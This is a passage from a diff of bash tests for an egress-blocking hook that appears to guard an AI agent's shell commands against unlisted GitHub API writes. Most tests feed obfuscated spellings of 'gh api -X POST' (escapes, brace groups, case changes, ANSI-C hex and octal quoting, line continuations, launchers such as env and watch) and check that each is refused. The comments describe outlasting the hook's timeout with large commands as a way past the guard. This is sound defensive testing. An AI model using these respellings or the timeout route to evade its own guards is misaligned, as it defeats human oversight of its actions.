+e007_sp_rowarm "AC-E007-SP-W3: env \\⏎-u X gh api -X POST <unlisted> — a continuation inside the prefix's option run — is located and recorded, refused with the phase forced, and not reached without the join" \
+  "env \\${E007_SP_NL}-u X ${E007_SP_PLAIN}" "shadow|not-allowlisted|${E007_W_NO}|look-ahead" "$E007_W_E" 2 1 - "$E007_SP_NJE" 0 0 0
+e007_sp_arm "AC-E007-SP-G1: env -u X \\⏎gh api -X POST <unlisted> — a next line that earns its own verdict — is kept apart and refused on day one; joined regardless, it would move to the record" \
+  "env -u X \\${E007_SP_NL}${E007_SP_PLAIN}" "$E007_W_S" 2 1 0 "$E007_SP_JA" 0 0 1
+e007_sp_arm "AC-E007-SP-G2: watch \\⏎gh api -X POST <unlisted> — a launcher outside the prefix set before a kept line — is refused on day one; joined regardless, it would be allowed with no record" \
+  "watch \\${E007_SP_NL}${E007_SP_PLAIN}" "$E007_W_S" 2 1 0 "$E007_SP_JA" 0 0 0
+e007_sp_arm "AC-E007-SP-G3: gh api <unlisted> # c \\⏎-X POST — a backslash inside a comment — joins nothing, so the read stays a read (SP-C2 is its contrast)" \
+  "gh api ${E007_W_NO} # c \\${E007_SP_NL}-X POST" "$E007_W_S" 0 0 0
+e007_sp_arm "AC-E007-SP-G4: gh api <unlisted> \\\\⏎-X POST — an even backslash run — is no continuation, so the read stays a read (SP-C2 is its contrast)" \
+  "gh api ${E007_W_NO} \\\\${E007_SP_NL}-X POST" "$E007_W_S" 0 0 0
+e007_sp_arm "AC-E007-SP-G5: nice -n \\⏎5 gh api -X POST <unlisted> — the option's argument opening the next line — is kept apart and not reached even with the phase forced (a declared residual, pinned); joined regardless, it is recorded" \
+  "nice -n \\${E007_SP_NL}5 ${E007_SP_PLAIN}" "$E007_W_E" 0 0 0 "$E007_SP_JA" 0 0 1
+
+# ---- The command-word normalization: escape, brace, case, and the two quote forms ----
+e007_sp_arm "AC-E007-SP-E1: \\gh api -X POST <unlisted> — an escaped verb — is refused on day one, and not reached without the escape step" \
+  "\\gh api -X POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_NE" 0 0 0
+e007_sp_arm "AC-E007-SP-E2: gh \\api -X POST <unlisted> — an escaped subcommand — is refused on day one (a declared tightening), and not reached without the escape step" \
+  "gh \\api -X POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_NE" 0 0 0
+e007_sp_arm "AC-E007-SP-B1: {gh,api} -X POST <unlisted> — a brace group that expands to the verb and subcommand — is refused on day one, and not reached without the brace step" \
+  "{gh,api} -X POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_NB" 0 0 0
+e007_sp_arm "AC-E007-SP-L1: GH api -X POST <unlisted> — a letter-case variant of the verb — is refused on day one, and not reached without the case step" \
+  "GH api -X POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_NF" 0 0 0
+e007_sp_arm "AC-E007-SP-A1: \$'\\x67h' api -X POST <unlisted> — an ANSI-C-quoted verb with a hex escape — is refused on day one, and not reached without ANSI-C decoding" \
+  "\$'\\x67h' api -X POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_NC" 0 0 0
+e007_sp_arm "AC-E007-SP-A6: gh api -X \$'POST' <unlisted> — an ANSI-C-quoted method value — is refused on day one (a declared tightening), and read as a read without ANSI-C decoding" \
+  "gh api -X \$'POST' ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_NC" 0 0 0
+_sp_why=""
+e007_w_run "$E007_W_S" "gh api -X POST \$'${E007_W_OK}'"
+{ [ "$E007_D_EXIT" = 0 ] && [ "$E007_D_BLK" = 0 ] && [ "$E007_D_WRN" = 0 ]; } || _sp_why="${_sp_why} [s] exit=${E007_D_EXIT} refusals+${E007_D_BLK} rows+${E007_D_WRN}, want 0 +0 +0;"
+e007_w_run "$E007_SP_NC" "gh api -X POST \$'${E007_W_OK}'"
+{ [ "$E007_D_EXIT" = 2 ] && [ "$E007_D_BLK" = 1 ] && /usr/bin/grep -q 'unresolvable' <<<"$E007_D_ERR"; } || _sp_why="${_sp_why} [nc] exit=${E007_D_EXIT} refusals+${E007_D_BLK}, want 2 +1 with cause unresolvable;"
+if [ -z "$_sp_why" ]; then
+  e007_d_pass "AC-E007-SP-A7: gh api -X POST \$'<allowlisted>' — an ANSI-C-quoted allowlisted path — is allowed (a declared precision improvement), and refused as unresolvable without ANSI-C decoding"
+else
+  e007_d_fail "AC-E007-SP-A7: an ANSI-C-quoted allowlisted path is allowed, and refused as unresolvable without decoding" "$_sp_why"
+fi
+
+# ---- The fast path admits what the transformations behind it resolve ----
+e007_sp_arm "AC-E007-SP-F1: g\\h api -X POST <unlisted> — an escape inside the verb — is refused on day one; the fast path skips it without its widening, and admits it on the backslash when tested raw" \
+  "g\\h api -X POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_FP" 0 0 0 "$E007_SP_FR" 2 1 0
+e007_sp_arm "AC-E007-SP-F2: GH api -X POST <unlisted> — a case variant — is refused on day one; the fast path skips it without its widening" \
+  "GH api -X POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_FP" 0 0 0
+e007_sp_arm "AC-E007-SP-F3: \$'\\147\\150' api -X POST <unlisted> — an ANSI-C verb of octal escapes — is refused on day one; the fast path skips it without its widening" \
+  "\$'\\147\\150' api -X POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_FP" 0 0 0
+e007_sp_arm "AC-E007-SP-F4: g''h api -X POST <unlisted> — the verb split by an empty quote pair — is refused on day one; the fast path skips it without its widening, and when tested raw" \
+  "g''h api -X POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_FP" 0 0 0 "$E007_SP_FR" 0 0 0
+e007_sp_arm "AC-E007-SP-F5: \$'g'\$'h' api -X POST <unlisted> — the verb as two adjacent ANSI-C strings — is refused on day one; the fast path skips it without its widening, and when tested raw" \
+  "\$'g'\$'h' api -X POST ${E007_W_NO}" "$E007_W_S" 2 1 0 "$E007_SP_FP" 0 0 0 "$E007_SP_FR" 0 0 0
+
+# ---- AC-E007-T* (#8315, DT pass 2): the fast path's cost is linear in the command ----
+#
+# The fast-path strip runs on every Bash command that reaches -007, before the gh decision, so
+# its cost bounds the whole hook on any command, and a PreToolUse hook that outlasts the
+# runtime's command-hook timeout does not block. On bash 3.2 a global pattern substitution over
+# the whole command grows faster than the command once the command carries a character it
+# replaces, the bracket class and three single-character substitutions alike, so the strip is
+# now one linear pass: one pass of tr in the C locale, which deletes the same three bytes. EQ
+# holds its output byte for byte against the bracket class on a dense input, beside a near miss
+# that keeps `$` and must differ. T1 to T6 run the whole sandbox hook on large benign commands
+# (no gh, one `$` a line) at several sizes, in en_US.UTF-8 and in C, under a watchdog: each must
+# finish inside the budget and allow. T-CTL is the instrument's sensitivity: the same hook with its
+# fast-strip line set back to the bracket class, on a large command in UTF-8, must be stopped at
+# the budget. The budget is a ceiling with headroom for a loaded host, not the expected time.
+E007_T_LIMIT="${E007_T_LIMIT_DS:-200}"   # tenths of a second
+# e007_t_ratio <tenths> <limit> — a run's cost as a share of its budget, or "stopped" when the watchdog ended it:
+# what a timed arm prints in place of a time, so no output line pairs a command's size with a time.
+e007_t_ratio() { if [ "$1" = -1 ]; then /usr/bin/printf stopped; else /usr/bin/awk -v d="$1" -v l="$2" 'BEGIN { printf "%.2f", (l > 0 ? d / l : 0) }'; fi; }
+E007_T_R="${E007_W_BASE}/t"
+/bin/mkdir -p "$E007_T_R"
+E007_T_X_BRACKET='s|^\( *\)egress_fq=.*  # respell: fast-strip$|\1egress_fq="${COMMAND//[\\"\\'"'"'\\$]/}"  # respell: fast-strip|'
+E007_T_BK="${E007_W_BASE}/tbk"; e007_w_copy "$E007_T_BK" "$E007_T_X_BRACKET"
+# e007_t_cmd <bytes> <file> — a benign command of exactly <bytes> bytes: one `$` a line, no gh.
+e007_t_cmd() {
+  /usr/bin/awk -v n="$1" 'BEGIN { l = "echo the quick brown fox jumps over $one lazy dog\n"; s = ""
+    while (length(s) < n) s = s l; printf "%s", substr(s, 1, n) }' > "$2"
+}
+# e007_t_reap <pid> — stop a process and every process under it, children first, with KILL. A TERM
+# is not enough to stop a hook: bash defers it until a running parameter expansion returns, which
+# is the very cost being timed, and a command-substitution subshell outlives a parent that dies, so
+# it would go on burning a core after its arm has been read (DT pass 3).
+e007_t_reap() {
+  local c
+  for c in $(/usr/bin/pgrep -P "$1" 2>/dev/null); do e007_t_reap "$c"; done
+  kill -9 "$1" 2>/dev/null
+}
+# e007_t_timed <sandbox> <locale> <command-file> <limit> — the sandbox hook on the Bash payload of
+# the command, under <locale>; a watchdog stops it at <limit> tenths. Sets E007_T_DS (tenths
+# elapsed, -1 when stopped) and E007_T_EXIT.
+e007_t_timed() {
+  local hooks="$1/.claude/hooks" pay="${E007_T_R}/payload.json" pid n=0
+  e007_d_bash "$(/bin/cat "$3")" "$1" > "$pay"
+  /usr/bin/printf '%s' enforce > "${hooks}/.mode"
+  LC_ALL="$2" PMO_SCOPE_GUARD_ROOT="$1" PMO_PLATFORM_CONFIG_ROOT="$1/.cfg" \
+    /bin/bash "${hooks}/block-egress.sh" < "$pay" > /dev/null 2>&1 &
+  pid=$!
+  while kill -0 "$pid" 2>/dev/null; do
+    if [ "$n" -ge "$4" ]; then
+      e007_t_reap "$pid"; wait "$pid" 2>/dev/null
+      E007_T_DS=-1; E007_T_EXIT=-1; return 0
+    fi
+    /bin/sleep 0.1; n=$(( n + 1 ))
+  done
+  E007_T_EXIT=0; wait "$pid" || E007_T_EXIT=$?
+  E007_T_DS="$n"
+}
+# EQ — the shipped strip line, evaluated as the hook evaluates it, against the bracket class.
+_t_line="$(/usr/bin/sed -n 's/^ *\(egress_fq=.*\)  # respell: fast-strip$/\1/p' "$E007_W_SRC")"
+_t_bracket='egress_fq="${COMMAND//[\"\'"'"'\$]/}"'
+_t_keep='egress_fq="${COMMAND//\"/}"; egress_fq="${egress_fq//\'"'"'/}"'
+/usr/bin/awk 'BEGIN { for (i = 0; i < 10; i++) printf "gh api -X POST \"repos/o/r\" '"'"'q'"'"' $x ${y} $'"'"'\\x41'"'"' \\\" \\'"'"' \\$ \\\\ naïve 日本 ü !#%%&()*+,-./:;<=>?@[]^_`{|}~ \"a'"'"'b\" '"'"'c\"d'"'"' $\"e\"\n"; printf "end" }' > "${E007_T_R}/dense.cmd"
+e007_t_eval() { # <locale> <assignment line> <out>
+  LC_ALL="$1" /bin/bash -c 'readonly TR=/usr/bin/tr; set -euo pipefail
+    COMMAND="$(/bin/cat "$1"; /usr/bin/printf x)"; COMMAND="${COMMAND%x}"; eval "$2"; /usr/bin/printf "%s" "$egress_fq"' \
+    _ "${E007_T_R}/dense.cmd" "$2" > "$3" 2>/dev/null
+}
+_t_why=""
+for _t_loc in en_US.UTF-8 C; do
+  e007_t_eval "$_t_loc" "$_t_line" "${E007_T_R}/eq-shipped.out" || _t_why="${_t_why} [${_t_loc}] the shipped line did not run;"
+  e007_t_eval "$_t_loc" "$_t_bracket" "${E007_T_R}/eq-bracket.out" || _t_why="${_t_why} [${_t_loc}] the bracket line did not run;"
+  e007_t_eval "$_t_loc" "$_t_keep" "${E007_T_R}/eq-keep.out" || _t_why="${_t_why} [${_t_loc}] the near-miss line did not run;"
+  /usr/bin/cmp -s "${E007_T_R}/eq-shipped.out" "${E007_T_R}/eq-bracket.out" || _t_why="${_t_why} [${_t_loc}] shipped != bracket;"
+  /usr/bin/cmp -s "${E007_T_R}/eq-keep.out" "${E007_T_R}/eq-bracket.out" && _t_why="${_t_why} [${_t_loc}] the near miss equals the bracket class (the comparison cannot see a difference);"
+  [ -s "${E007_T_R}/eq-bracket.out" ] || _t_why="${_t_why} [${_t_loc}] empty bracket output;"
+done
+case "$_t_line" in *'"$TR"'*) ;; *) _t_why="${_t_why} the shipped fast-strip line does not run tr: [${_t_line}];" ;; esac
+if [ -z "$_t_why" ]; then
+  e007_d_pass "AC-E007-T-EQ: the shipped strip equals the bracket class byte for byte on a dense input in UTF-8 and C, and a near miss that keeps \$ differs"
+else
+  e007_d_fail "AC-E007-T-EQ: the shipped strip equals the bracket class byte for byte" "$_t_why"
+fi
+for _t_kb in 10 20 40; do e007_t_cmd $(( _t_kb * 1024 )) "${E007_T_R}/c${_t_kb}.cmd"; done
+_t_n=0
+for _t_loc in en_US.UTF-8 C; do
+  for _t_kb in 10 20 40; do
+    _t_n=$(( _t_n + 1 ))
+    e007_t_timed "$E007_W_S" "$_t_loc" "${E007_T_R}/c${_t_kb}.cmd" "$E007_T_LIMIT"
+    if [ "$E007_T_DS" != -1 ] && [ "$E007_T_EXIT" = 0 ]; then
+      e007_d_pass "AC-E007-T${_t_n}: a ${_t_kb} KB benign command in ${_t_loc} clears the whole hook within the budget and is allowed"
+    else
+      e007_d_fail "AC-E007-T${_t_n}: a long benign command in ${_t_loc} clears the hook inside the budget and is allowed — measured ratio $(e007_t_ratio "${E007_T_DS}" "${E007_T_LIMIT}") of the budget, bound 1.00" \
+        "\"stopped\" is the watchdog ending the run at the budget; exit=${E007_T_EXIT} (want 0)"
+    fi
+  done
+done
+e007_t_timed "$E007_T_BK" en_US.UTF-8 "${E007_T_R}/c10.cmd" "$E007_T_LIMIT"
+if [ "$E007_T_DS" = -1 ] && /usr/bin/grep -q -F 'egress_fq="${COMMAND//[' "${E007_T_BK}/mut.sh"; then
+  e007_d_pass "AC-E007-T-CTL: the hook with the bracket-class strip is stopped at the budget on a large command in UTF-8 — the instrument sees the cost"
+else
+  e007_d_fail "AC-E007-T-CTL: the hook with the bracket-class strip is stopped at the budget — measured ratio $(e007_t_ratio "${E007_T_DS}" "${E007_T_LIMIT}") of the budget, bound 1.00" \
+    "exit=${E007_T_EXIT}; a copy that finishes, or that carries no bracket-class line, cannot show T1-T6 measure anything (BROKEN PROBE)"
+fi
+
+# ---- AC-E007-X* (#8315, DT pass 3): every substitution of the scanner is a linear pass ----
+#
+# The scanner ran global pattern substitutions over its quoted spans, its comments, its tokens, its
+# physical lines and the whole command, and on bash 3.2 each costs more than linear time in the
+# text it scans once that text carries a match for its pattern — so a large command could hold
+# the hook past the runtime's command-hook timeout, after which a PreToolUse hook does not block. A piece of at least EGRESS_LINEAR_MIN characters now takes one pass of tr, sed or awk
+# in the C locale first, on a line marked `# linear: <site>`. X-EQ-<site> lifts each marked block
+# out of the hook and runs it with the bound at 0 (the pass runs) and at 10^9 (the substitutions
+# alone, which is the code before this change): the two must be equal byte for byte on a dense
+# input — every byte from 1 to 255, multibyte letters, invalid UTF-8, the sentinels and each
+# operator — and on its edge endings, in en_US.UTF-8 and in C; the pass alone must equal them as
+# well; and a near miss, the pass with one rewrite wrong, must differ. X1 to X30 run the whole
+# sandbox hook under the watchdog on five benign shapes at 10, 20 and 40 KB in both locales — the
+# dollar filler, separator-dense, one big quoted span after a long quoted comment, redirection-
+# dense, and separator-dense ending in a quote it never closes (the unparseable branch's reader) —
+# each inside the budget and allowed. X-CTL is the instrument's sensitivity: a copy whose bound
+# never lets a pass run is stopped at the budget on a long quoted span in UTF-8. X-FB holds the
+# fallback: a copy whose pass tools do not exist reads the verdicts of the shipped hook on commands
+# that reach every pass, and raises no hook error. The token mark strip runs long only on one word
+# built from many adjacent ANSI-C spans, which no timed shape builds, so X-EQ alone pins its block;
+# the continuation join's mark-free twin runs long on the continuation-dense shape of the Y arms
+# below (DT pass 4), which times it end to end.
+E007_L_R="${E007_W_BASE}/l"
+/bin/mkdir -p "$E007_L_R"
+/usr/bin/printf '%s\n' 'set -euo pipefail' 'readonly TR=/usr/bin/tr' \
+  "readonly EGRESS_SENT=\$'\\001' EGRESS_RSP=\$'\\004' EGRESS_QLT=\$'\\005' EGRESS_QGT=\$'\\006' EGRESS_BND_OLD=\$'\\002' EGRESS_BND_NEW=\$'\\003'" \
+  > "${E007_L_R}/prelude.sh"
+# The dense input, three times over, and its edge endings: a newline, three newlines, a separator,
+# the pass's own terminator byte, and the empty text.
+LC_ALL=C /usr/bin/awk 'BEGIN { for (r = 0; r < 3; r++) { for (i = 1; i < 256; i++) printf "%c", i
+  printf "%s", "naïve 日本 ü \377\303 x\342\202 y\200 ;&|()#`<>\"'"'"'\001\002\003\004\005\006\177>&<&&>>|.$\\ \t\n" } }' \
+  > "${E007_L_R}/in-0"
+{ /bin/cat "${E007_L_R}/in-0"; /usr/bin/printf '\n'; } > "${E007_L_R}/in-1"
+{ /bin/cat "${E007_L_R}/in-0"; /usr/bin/printf '\n\n\n'; } > "${E007_L_R}/in-2"
+{ /bin/cat "${E007_L_R}/in-0"; /usr/bin/printf ';'; } > "${E007_L_R}/in-3"
+{ /bin/cat "${E007_L_R}/in-0"; /usr/bin/printf '.'; } > "${E007_L_R}/in-4"
+: > "${E007_L_R}/in-5"
+# e007_l_block <src> <site> <lines> <out> — the line marked `# linear: <site>` and the lines after
+# it, <lines> in all; returns 1 unless exactly one line carries the mark.
+e007_l_block() {
+  M="# linear: $2" /usr/bin/awk -v k="$3" 'BEGIN { m = ENVIRON["M"] }
+    length($0) >= length(m) && substr($0, length($0) - length(m) + 1) == m { c++; n = k }
+    n > 0 { print; n-- }
+    END { exit c == 1 ? 0 : 1 }' "$1" > "$4"
+}
+# e007_l_swap <in> <from> <to> <out> — the first occurrence of <from> replaced by <to>, literally.
+e007_l_swap() {
+  F="$2" T="$3" /usr/bin/awk 'BEGIN { f = ENVIRON["F"]; t = ENVIRON["T"] }
+    !d && (i = index($0, f)) { $0 = substr($0, 1, i - 1) t substr($0, i + length(f)); d = 1 }
+    { print }
+    END { exit d ? 0 : 1 }' "$1" > "$4"
+}
+# e007_l_eval <locale> <bound> <variable> <block> <input> <out> — the block in a fresh /bin/bash,
+# its variable holding the input, the bound at <bound>; writes the variable after the block.
+e007_l_eval() {
+  LC_ALL="$1" /bin/bash -c '. "$1"; EGRESS_LINEAR_MIN="$2"; lp=""; egress_lp=""; egress_toks=(x); i=0
+    __in="$(/bin/cat "$5"; printf x)"; __in="${__in%x}"
+    eval "$3=\"\$__in\""
+    . "$4"
+    eval "printf %s \"\${$3}\"" > "$6"' _ "${E007_L_R}/prelude.sh" "$2" "$3" "$4" "$5" "$6"
+}
+# e007_l_eq <site> <lines> <variable> <near-miss from> <near-miss to>
+e007_l_eq() {
+  local why="" loc k blk="${E007_L_R}/b-$1" near="${E007_L_R}/n-$1" one="${E007_L_R}/o-$1"
+  e007_l_block "$E007_W_SRC" "$1" "$2" "$blk" || why="${why} no single line marked \`# linear: $1\`;"
+  e007_l_swap "$blk" "$4" "$5" "$near" || why="${why} the near-miss edit did not apply;"
+  /usr/bin/head -1 "$blk" > "$one"
+  if [ -z "$why" ]; then
+    for loc in en_US.UTF-8 C; do
+      for k in 0 1 2 3 4 5; do
+        e007_l_eval "$loc" 1000000000 "$3" "$blk" "${E007_L_R}/in-$k" "${E007_L_R}/ship.out" \
+          || why="${why} [${loc} in-${k}] the substitutions did not run;"
+        e007_l_eval "$loc" 0 "$3" "$blk" "${E007_L_R}/in-$k" "${E007_L_R}/pass.out" \
+          || why="${why} [${loc} in-${k}] the pass did not run;"
+        /usr/bin/cmp -s "${E007_L_R}/ship.out" "${E007_L_R}/pass.out" || why="${why} [${loc} in-${k}] pass != substitutions;"
+        if [ "$1" != redirect-ops ]; then
+          e007_l_eval "$loc" 0 "$3" "$one" "${E007_L_R}/in-$k" "${E007_L_R}/one.out" \
+            || why="${why} [${loc} in-${k}] the pass line alone did not run;"
+          /usr/bin/cmp -s "${E007_L_R}/ship.out" "${E007_L_R}/one.out" || why="${why} [${loc} in-${k}] the pass alone != substitutions;"
+        fi
+      done
+      e007_l_eval "$loc" 1000000000 "$3" "$blk" "${E007_L_R}/in-0" "${E007_L_R}/ship.out" || why="${why} [${loc}] the reference did not run;"
+      e007_l_eval "$loc" 0 "$3" "$near" "${E007_L_R}/in-0" "${E007_L_R}/near.out" || why="${why} [${loc}] the near miss did not run;"
+      [ -s "${E007_L_R}/ship.out" ] || why="${why} [${loc}] empty reference output;"
+      /usr/bin/cmp -s "${E007_L_R}/ship.out" "${E007_L_R}/near.out" \
+        && why="${why} [${loc}] the near miss equals the substitutions (the comparison cannot see a difference);"
+    done
+  fi
+  if [ -z "$why" ]; then
+    e007_d_pass "AC-E007-X-EQ-$1: the \`# linear: $1\` pass equals its substitutions byte for byte on a dense input and its edge endings in UTF-8 and C, alone and with them, and a near miss differs"
+  else
+    e007_d_fail "AC-E007-X-EQ-$1: the \`# linear: $1\` pass equals its substitutions byte for byte" "$why"
+  fi
+}
+e007_l_eq comment 3 body "'\\042\\047' '\\001\\001'" "'\\042\\047' '\\001\\002'"
+e007_l_eq span 13 body "\\005\\006'" "\\006\\005'"
+e007_l_eq mark 2 t "-d '\\004'" "-d '\\005'"
+e007_l_eq stand-in 3 t "'\\074\\076'" "'\\076\\074'"
+e007_l_eq redirect-ops 8 s " -e \"s/&>/\${EGRESS_SENT}>/g\"" ""
+e007_l_eq mark-free 2 s "-d '\\004'" "-d '\\005'"
+e007_l_eq view 4 view "'\\012\\012\\012'" "'\\012\\012\\001'"
+e007_l_eq segments 7 egress_segs 'gsub(/[()`]/, "\n" w)' 'gsub(/[()`]/, "\n" o)'
+# e007_l_fill <bytes> <head> <unit> <tail> — the head, as many units as fit, then the tail.
+e007_l_fill() {
+  H="$2" U="$3" T="$4" /usr/bin/awk -v n="$1" 'BEGIN { h = ENVIRON["H"]; u = ENVIRON["U"]; t = ENVIRON["T"]; s = h
+    while (length(s) + length(u) + length(t) <= n) s = s u
+    printf "%s", s t }'
+}
+# e007_l_cmd <shape> <bytes> <file> — one of the five benign shapes; each carries `gh`, so the fast
+# path hands it to the scanner, and each ends in a gh api read or in an unclosed quote.
+e007_l_cmd() {
+  case "$1" in
+    dollar)      e007_l_fill "$2" '' 'echo the quick brown fox jumps over $one lazy dog'$'\n' 'gh api repos/o/r' > "$3" ;;
+    separator)   e007_l_fill "$2" 'echo gh;' 'echo a;echo b|cat&echo c;' 'gh api repos/o/r' > "$3" ;;
+    quoted)
+      e007_l_fill $(( $2 / 4 )) "echo gh # it's \"x\" " "don't \"stop\" " $'\n' > "$3.c"
+      e007_l_fill $(( $2 - $(/usr/bin/wc -c < "$3.c") )) "echo '" 'a b'$'\t''c;d&e|f(g)h#i`j<k>l"m'$'\n' "'"$'\n''gh api repos/o/r' > "$3.q"
+      /bin/cat "$3.c" "$3.q" > "$3" ;;
+    redirection) e007_l_fill "$2" 'echo gh' ' >&2 2>&1 <&0 &>/dev/null >|/dev/null' ' ; gh api repos/o/r' > "$3" ;;
+    unparseable) e007_l_fill "$2" 'echo gh;' 'echo a;echo b|cat&echo c;' "echo 'x" > "$3" ;;
+  esac
+}
+for _l_shape in dollar separator quoted redirection unparseable; do
+  for _l_kb in 10 20 40; do e007_l_cmd "$_l_shape" $(( _l_kb * 1024 )) "${E007_L_R}/${_l_shape}-${_l_kb}.cmd"; done
+done
+_l_n=0
+for _l_shape in dollar separator quoted redirection unparseable; do
+  for _l_loc in en_US.UTF-8 C; do
+    for _l_kb in 10 20 40; do
+      _l_n=$(( _l_n + 1 ))
+      e007_t_timed "$E007_W_S" "$_l_loc" "${E007_L_R}/${_l_shape}-${_l_kb}.cmd" "$E007_T_LIMIT"
+      if [ "$E007_T_DS" != -1 ] && [ "$E007_T_EXIT" = 0 ]; then
+        e007_d_pass "AC-E007-X${_l_n}: the ${_l_shape} shape at ${_l_kb} KB in ${_l_loc} clears the whole hook within the budget and is allowed"
+      else
+        e007_d_fail "AC-E007-X${_l_n}: the long ${_l_shape} shape in ${_l_loc} clears the hook inside the budget and is allowed — measured ratio $(e007_t_ratio "${E007_T_DS}" "${E007_T_LIMIT}") of the budget, bound 1.00" \
+          "\"stopped\" is the watchdog ending the run at the budget; exit=${E007_T_EXIT} (want 0)"
+      fi
+    done
+  done
+done
+E007_L_X_NOPASS='s|^readonly EGRESS_LINEAR_MIN=256$|readonly EGRESS_LINEAR_MIN=1000000000|'
+E007_L_NP="${E007_W_BASE}/lnp"; e007_w_copy "$E007_L_NP" "$E007_L_X_NOPASS"
+e007_t_timed "$E007_L_NP" en_US.UTF-8 "${E007_L_R}/quoted-20.cmd" "$E007_T_LIMIT"
+if [ "$E007_T_DS" = -1 ] && /usr/bin/grep -q -F -x 'readonly EGRESS_LINEAR_MIN=1000000000' "${E007_L_NP}/mut.sh"; then
+  e007_d_pass "AC-E007-X-CTL: a copy whose bound never lets a pass run is stopped at the budget on a long quoted span in UTF-8 — the instrument sees the cost"
+else
+  e007_d_fail "AC-E007-X-CTL: a copy whose bound never lets a pass run is stopped at the budget — measured ratio $(e007_t_ratio "${E007_T_DS}" "${E007_T_LIMIT}") of the budget, bound 1.00" \
+    "exit=${E007_T_EXIT}; a copy that finishes, or that carries no raised bound, cannot show X1-X30 measure anything (BROKEN PROBE)"
+fi
+# X-FB: every pass's tool repointed to a path that does not exist, so each pass fails and leaves its
+# piece to the substitutions — and, since DT pass 4, the quote walk's awk with them, so a long text
+# is read by the walk's loop instead. Three commands that reach every pass long: a write to an unlisted
+# path behind a long quoted comment, a long quoted span, a long redirection run, an ANSI-C span on
+# a long word and a continuation (refused on day one); the same with a read (allowed); and a
+# respelled write in a long separator-dense command ending in an unclosed quote (refused by the
+# unparseable branch's reader).
+E007_L_X_NOTOOL='/# linear: [a-z-]*$/s#"\$TR"#/nonexistent/tr#; /# linear: [a-z-]*$/s#/usr/bin/sed#/nonexistent/sed#; /# linear: [a-z-]*$/s#/usr/bin/awk#/nonexistent/awk#'
+E007_L_NT="${E007_W_BASE}/lnt"; e007_w_copy "$E007_L_NT" "$E007_L_X_NOTOOL"
+e007_l_fill 400 "echo gh # it's \"x\" " "don't \"stop\" " $'\n' > "${E007_L_R}/fb.c"
+e007_l_fill 400 "echo '" 'a b'$'\t''c;d&e|f(g)h#i`j<k>l"m'$'\n' "'" > "${E007_L_R}/fb.q"
+{ e007_l_fill 400 '' ' >&2 2>&1 <&0 &>/dev/null >|/dev/null' ''
+  /usr/bin/printf '%s' " x\\"$'\n'"y \$'a'$(e007_l_fill 300 '' 'b' '');"; } > "${E007_L_R}/fb.r"
+_l_fbw="$(/bin/cat "${E007_L_R}/fb.c" "${E007_L_R}/fb.q" "${E007_L_R}/fb.r")gh api -X POST ${E007_W_NO}"
+_l_fbr="$(/bin/cat "${E007_L_R}/fb.c" "${E007_L_R}/fb.q" "${E007_L_R}/fb.r")gh api repos/o/r"
+_l_fbu="$(e007_l_fill 300 '' 'echo a;echo b|cat&echo c;' '')\\gh api -X POST ${E007_W_NO} 'x"
+_l_why=""
+_l_tools="$(/usr/bin/grep -c -F '/nonexistent/' "${E007_L_NT}/mut.sh")" || true
+[ "$_l_tools" = 9 ] || _l_why="${_l_why} the copy repoints ${_l_tools} pass lines, want 9;"
+for _l_c in "w:2:1:${_l_fbw}" "r:0:0:${_l_fbr}" "u:2:1:${_l_fbu}"; do
+  _l_tag="${_l_c%%:*}"; _l_rest="${_l_c#*:}"
+  _l_wx="${_l_rest%%:*}"; _l_rest="${_l_rest#*:}"
+  _l_wb="${_l_rest%%:*}"; _l_cmd="${_l_rest#*:}"
+  [ "${#_l_cmd}" -ge 256 ] || _l_why="${_l_why} [${_l_tag}] the command is shorter than the bound;"
+  e007_w_run "$E007_W_S" "$_l_cmd"
+  _l_s="${E007_D_EXIT}/${E007_D_BLK}"
+  e007_w_run "$E007_L_NT" "$_l_cmd"
+  _l_t="${E007_D_EXIT}/${E007_D_BLK}"
+  [ "$_l_s" = "${_l_wx}/${_l_wb}" ] || _l_why="${_l_why} [${_l_tag}] shipped reads ${_l_s}, want ${_l_wx}/${_l_wb};"
+  [ "$_l_t" = "$_l_s" ] || _l_why="${_l_why} [${_l_tag}] the copy without its tools reads ${_l_t}, the shipped hook ${_l_s};"
+  case "$E007_D_ERR" in *HOOK-ERROR*) _l_why="${_l_why} [${_l_tag}] the copy without its tools raised a hook error;" ;; esac
+done
+if [ -z "$_l_why" ]; then
+  e007_d_pass "AC-E007-X-FB: with every pass's tool missing, each pass falls back to its substitutions and the walk to its loop — a refused write, an allowed read and an unparseable respelled write read as the shipped hook reads them, with no hook error"
+else
+  e007_d_fail "AC-E007-X-FB: with every pass's tool missing, the verdicts equal the shipped hook's" "$_l_why"
+fi
+
+# ---- AC-E007-Y* (#8315, DT pass 4): the quote walk and the continuation join are linear ----
+#
+# Two loops of the scanner cost more than linear time on bash 3.2 in what they read. The quote walk
+# stepped through the text left to scan once per quoted span, with removals that re-measure that text
+# at every position they try, the first-character idiom among them; the continuation join re-tested
+# the line it had grown, once per joined line, for trailing backslashes and an open comment. A command
+# of many short quoted spans, or of many continuation lines, could therefore hold the hook past the
+# runtime's command-hook timeout, after which a PreToolUse hook does not block; on the continuation
+# shape this was the release's own regression, since main has no join. A long text now takes the walk
+# over pieces that one awk pass reads once (egress_neutralize_long), and the join reads a line at a
+# time beside its mark-free twin and tests only the line just added (egress_join_state); the comment
+# and trailing-backslash tests read a long text once. Y-EQ lifts the scanner's functions and runs them
+# with the bound at 0 (every long path) and at 10^9 (the code before this pass) on a dense set of
+# texts — quotes of both kinds, escaped quotes, comments, ANSI-C and locale spans, continuations,
+# multibyte letters and spaces, undecodable bytes, an unclosed quote — in en_US.UTF-8 and in C: the
+# walk's text and status, the join's text in both readings, and the two tests must be equal byte for
+# byte, and three near misses, each one edit of a long path, must each differ. Y1 to Y12 run the whole
+# sandbox hook under the watchdog on a continuation-dense and a quote-span-dense command at 10, 20
+# and 40 KB in both locales, each inside the budget and allowed. Y-CTL is the instrument's
+# sensitivity, one copy per loop: the raised-bound copy of X-CTL, whose walk is the loop before this
